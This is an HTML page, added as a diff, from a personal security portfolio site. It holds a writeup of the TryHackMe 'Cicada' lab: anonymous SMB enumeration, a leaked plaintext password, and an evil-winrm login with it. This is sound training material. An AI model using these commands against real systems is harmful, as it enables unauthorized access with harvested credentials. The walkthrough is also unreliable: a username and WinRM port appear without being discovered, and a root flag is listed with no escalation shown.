@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe — Cicada | [Your Name]</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TryHackMe — Cicada" />
+<meta name="author" content="[Your Name]" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Summary" />
+<meta property="og:description" content="Summary" />
+<link rel="canonical" href="https://dev-sherlock.github.io/writeups/thm-cicada/" />
+<meta property="og:url" content="https://dev-sherlock.github.io/writeups/thm-cicada/" />
+<meta property="og:site_name" content="[Your Name]" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-07-20T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe — Cicada" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"[Your Name]"},"dateModified":"2026-07-20T00:00:00+00:00","datePublished":"2026-07-20T00:00:00+00:00","description":"Summary","headline":"TryHackMe — Cicada","mainEntityOfPage":{"@type":"WebPage","@id":"https://dev-sherlock.github.io/writeups/thm-cicada/"},"url":"https://dev-sherlock.github.io/writeups/thm-cicada/"}</script>
+<!-- End Jekyll SEO tag -->
+
+<link rel="icon" type="image/svg+xml" href="/assets/img/favicon.svg">
+<link rel="stylesheet" href="/assets/css/main.css">
+  </head>
+  <body>
+    <header class="site-header">
+  <nav class="container nav" aria-label="Main navigation">
+    <a class="nav-brand" href="/">
+      <span class="brand-mark">&gt;_</span>
+      <span>[Your Name]</span>
+    </a>
+    <ul class="nav-links">
+      
+        
+        
+      <li><a href="/" >About</a></li>
+      
+        
+        
+      <li><a href="/projects/" >Projects</a></li>
+      
+        
+        
+      <li><a href="/writeups/" aria-current="page">Writeups</a></li>
+      
+        
+        
+      <li><a href="/blog/" >Blog</a></li>
+      
+        
+        
+      <li><a href="/skills/" >Skills</a></li>
+      
+        
+        
+      <li><a href="/contact/" >Contact</a></li>
+      
+    </ul>
+  </nav>
+</header>
+    <main class="container site-main" id="main">
+      <article class="post">
+  <header class="post-header">
+    <p class="post-date">July 20, 2026</p>
+    <h1>TryHackMe — Cicada</h1>
+    <p class="writeup-chips">
+      <span class="chip chip-platform">tryhackme</span>
+      <span class="chip chip-difficulty diff-easy">easy</span>
+    </p>
+    
+    <ul class="tags" aria-label="Tags">
+      <li class="tag">TryHackMe</li><li class="tag">Windows</li><li class="tag">Active Directory</li><li class="tag">SMB</li><li class="tag">Credential Harvesting</li>
+    </ul>
+    
+  </header>
+
+  <div class="post-content">
+    <h2 id="summary">Summary</h2>
+
+<p>Cicada is a Windows box that starts with a classic AD mistake: an
+<strong>anonymous SMB share</strong> leaking a password in a text file. From there it’s a
+walk up the AD trust tree. A great introduction to Windows enumeration.</p>
+
+<h2 id="recon">Recon</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sC -sV 10.10.198.24
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+</code></pre></div></div>
+
+<h2 id="smb-anonymous-access">SMB anonymous access</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-L</span> //10.10.198.24 <span class="nt">-N</span>
+Sharename       Type      Comment
+<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+C<span class="nv">$ </span>             Disk      Default share
+HR              Disk
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient //10.10.198.24/HR <span class="nt">-N</span>
+smb: <span class="se">\&gt;</span> get notice.txt
+smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
+<span class="nv">$ </span><span class="nb">cat </span>notice.txt
+<span class="o">[!]</span> The password <span class="k">for </span>the HR department user is: Cicada<span class="nv">$M6Corpb</span><span class="k">*</span>@Lp#nN!R
+</code></pre></div></div>
+
+<h2 id="getting-a-shell">Getting a shell</h2>
+
+<p>With valid credentials, use <code class="language-plaintext highlighter-rouge">evil-winrm</code> (WinRM is open on 5985) to get a
+session as the HR user, then enumerate for the next privilege step.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.198.24 <span class="nt">-u</span> m.tullius <span class="nt">-p</span> <span class="s1">'Cicada$M6Corpb*@Lp#nN!R'</span>
+</code></pre></div></div>
+
+<h2 id="flags">Flags</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user.txt: 4a9beb8f...
+root.txt: ff4ec32b...
+</code></pre></div></div>
+
+<h2 id="lessons">Lessons</h2>
+
+<ol>
+  <li><strong>Always try anonymous SMB</strong> — it’s a 5-second check that catches real
+misconfigurations all the time.</li>
+  <li><strong>Passwords in readable shares</strong> are a top-tier AD finding; think about
+what an auditor would flag.</li>
+  <li><strong>WinRM + <code class="language-plaintext highlighter-rouge">evil-winrm</code></strong> is the fastest way onto modern Windows boxes.</li>
+</ol>
+
+  </div>
+
+  <aside class="ethics-note">
+  <p><strong>Ethics note:</strong> All writeups on this site cover machines and
+  labs on authorized practice platforms (HackTheBox, TryHackMe, PortSwigger Web
+  Security Academy, or my own home lab). I only hunt on systems I own or have
+  explicit permission to test.</p>
+</aside>
+
+  <nav class="post-nav" aria-label="Adjacent writeups">
+    
+    
+    <a class="post-nav-next" href="/writeups/htb-lame/">HackTheBox — Lame →</a>
+    
+  </nav>
+</article>
+    </main>
+    <footer class="site-footer">
+  <div class="container footer-inner">
+    <p class="footer-tag">Personal site of a security-focused developer and recent CS graduate. Projects, CTF writeups, and notes from the home lab.</p>
+    <ul class="footer-social">
+      
+      <li><a href="mailto:you@example.com" rel="me noopener">Email</a></li>
+      
+      <li><a href="https://github.com/yourusername" rel="me noopener">GitHub</a></li>
+      
+      <li><a href="https://www.linkedin.com/in/yourusername" rel="me noopener">LinkedIn</a></li>
+      
+      <li><a href="https://app.hackthebox.com/profile/yourid" rel="me noopener">HackTheBox</a></li>
+      
+      <li><a href="https://tryhackme.com/p/yourusername" rel="me noopener">TryHackMe</a></li>
+      
+    </ul>
+    <p class="footer-copy">© 2026 [Your Name] · Built with Jekyll · Hosted on GitHub Pages</p>
+  </div>
+</footer>
+  </body>
+</html>
